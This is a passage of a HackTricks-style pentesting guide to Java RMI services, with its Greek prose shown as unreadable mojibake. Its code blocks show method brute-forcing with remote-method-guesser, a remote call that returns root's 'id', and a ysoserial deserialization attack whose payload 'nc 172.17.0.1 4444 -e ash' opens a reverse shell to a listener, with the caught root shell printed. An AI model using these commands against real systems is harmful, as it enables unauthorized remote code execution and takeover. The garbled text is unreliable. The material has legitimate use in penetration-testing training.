[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```
Î— Î­Î¾Î¿Î´Î¿Ï‚ Ï„Î·Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±Ï‚ Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï€Î¹Î¿ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÏÏ‚ ÏƒÏ„Î¹Ï‚ [ÏƒÎµÎ»Î¯Î´ÎµÏ‚ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ·Ï‚](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/actions.md#enum-action) Ï„Î¿Ï… Î­ÏÎ³Î¿Ï…. Î‘Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î±, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚.

ÎŸÎ¹ Ï„Î¹Î¼Î­Ï‚ `ObjID` Ï€Î¿Ï… ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ _remote-method-guesser_ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎ¿Ï…Î½ Ï„Î¿Î½ Ï‡ÏÏŒÎ½Î¿ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚. Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Î¬Î»Î»Ï‰Î½ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½:
```
$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] ObjNum: 		-4004948013687638236
[+] UID:
[+] 	Unique: 	1442798173
[+] 	Time: 		1640761503828 (Dec 29,2021 08:05)
[+] 	Count: 		-32760
```
## Bruteforcing Remote Methods

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏŒÏ„Î±Î½ Î´ÎµÎ½ Î­Ï‡Î¿Ï…Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÏ„ÎµÎ¯ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÎºÎ±Ï„Î¬ Ï„Î· Î´Î¹Î¬ÏÎºÎµÎ¹Î± Ï„Î·Ï‚ Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·Ï‚, Î¿Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ _RMI_ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÎºÎ¸Î­ÏƒÎ¿Ï…Î½ ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½ÎµÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï€Î±ÏÎ¬ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ ÏŒÏ„Î¹ Î· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± _RMI_ Î¼Îµ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ…ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ _RMI_ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï†Î¯Î»Ï„ÏÎ± Î±Ï€Î¿-serialization, ÏŒÏ„Î±Î½ Î¼Î¹Î»Î¬Î¼Îµ Î¼Îµ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½ÎµÏ‚ _RMI_ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚, Ï„Î­Ï„Î¿Î¹Î± Ï†Î¯Î»Ï„ÏÎ± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½. Î“Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Î­Î³ÎºÏ…ÏÎµÏ‚ Ï…Ï€Î¿Î³ÏÎ±Ï†Î­Ï‚ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ ÏƒÏ„Î¹Ï‚ _RMI_ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Ï€Î¿Î»ÏÏ„Î¹Î¼Î¿.

Î”Ï…ÏƒÏ„Ï…Ï‡ÏÏ‚, Ï„Î¿ _Java RMI_ Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ ÏƒÎµ _Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±_. Î Î±Ï' ÏŒÎ»Î± Î±Ï…Ï„Î¬, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î³Î¯Î½ÎµÎ¹ bruteforce Ï…Ï€Î¿Î³ÏÎ±Ï†ÏÎ½ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ Î¼Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) Î® Ï„Î¿ [rmiscout](https://github.com/BishopFox/rmiscout):
```
$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```
ÎŸÎ¹ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎºÎ±Î»Î¿ÏÎ½Ï„Î±Î¹ Î­Ï„ÏƒÎ¹:
```
$ rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar
[+] uid=0(root) gid=0(root) groups=0(root)
```
Î‰ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„Î®:
```
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)

$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
```
Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏƒÎµ Î±Ï…Ï„Î¬ Ï„Î± Î¬ÏÎ¸ÏÎ±:

* [Attacking Java RMI services after JEP 290](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
* [Method Guessing](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/method-guessing.md)
* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://bishopfox.com/blog/rmiscout)

Î•ÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÎºÏ„Î¯Î¼Î·ÏƒÎ·, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ ÏƒÎµ Î¼Î·Ï‡Î±Î½Î­Ï‚ Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·Ï‚ Î® _GitHub_ Î³Î¹Î± Ï„Î· Î´Î¹ÎµÏ€Î±Ï†Î® Î® Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î¹Î±Ï‚ ÏƒÏ…Î½Î±Î½Ï„Î·Î¸ÎµÎ¯ÏƒÎ±Ï‚ _RMI_ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚. Î¤Î¿ _bound name_ ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î·Ï‚ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·Ï‚ ÎºÎ»Î¬ÏƒÎ·Ï‚ Î® Î´Î¹ÎµÏ€Î±Ï†Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î± ÎµÎ´Ï.

## Î“Î½Ï‰ÏƒÏ„Î­Ï‚ Î”Î¹ÎµÏ€Î±Ï†Î­Ï‚

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ÏƒÎ·Î¼ÎµÎ¹ÏÎ½ÎµÎ¹ Ï„Î¹Ï‚ ÎºÎ»Î¬ÏƒÎµÎ¹Ï‚ Î® Ï„Î¹Ï‚ Î´Î¹ÎµÏ€Î±Ï†Î­Ï‚ Ï‰Ï‚ `known` Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Î¼Î­Î½ÎµÏ‚ ÏƒÏ„Î· ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ® Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï„Î¿Ï… ÎµÏÎ³Î±Î»ÎµÎ¯Î¿Ï… Î³Î¹Î± Î³Î½Ï‰ÏƒÏ„Î­Ï‚ _RMI services_. Î£Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± `known` Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· _RMI service_:
```
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]

$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```
## Shodan

* `port:1099 java`

## Tools

* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://github.com/BishopFox/rmiscout)
* [BaRMIe](https://github.com/NickstaDB/BaRMIe)

## References

* [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

## HackTricks Automatic Commands
```
Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.
Port_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.
Protocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out

Entry_1:
Name: Enumeration
Description: Perform basic enumeration of an RMI service
Command: rmg enum {IP} {PORT}
```
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=1099-pentesting-java-rmi) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± **Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î±** ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=1099-pentesting-java-rmi" %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
